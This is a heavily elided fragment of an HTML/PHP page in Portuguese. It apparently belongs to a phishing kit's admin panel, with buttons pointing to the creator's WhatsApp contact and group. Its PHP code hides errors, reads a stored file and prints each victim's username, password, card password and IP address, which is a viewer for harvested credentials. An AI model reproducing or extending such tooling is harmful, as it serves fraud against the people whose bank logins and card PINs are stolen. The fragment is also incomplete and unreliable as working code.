...
<style>
		...
		body{
		  ...
		  background: url('img/imagens/IMG-20200423-WA0638.jpg') center center no-repeat fixed; 
...
</div> </td> <<td> <div> <a class="button" href="#" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">WHATSAPP CRIADOR</a>
...
<a class="button" href="#" style="float: center; border:1px solid; padding: 11px 21px; vertical-align: middle; background:DeepSkyBlue; color:white;border-radius:6px; font-size: 10px; font-family:helvetica, serif;text-decoration:none;">GRUPO WHATSAPP CRIADOR</a>
...
error_reporting(0);
	...
	if(file_exists($fl)){
		...
		for($i = 0; $i < count($arr); $i++){
			...
			echo "Usuario: ".$arr[$i][0]."<br>Senha: ".$arr[$i][1]."<br>SenhaCard: ".$arr[$i][2]."<br>IP: ".$arr[$i][3]."<br>";
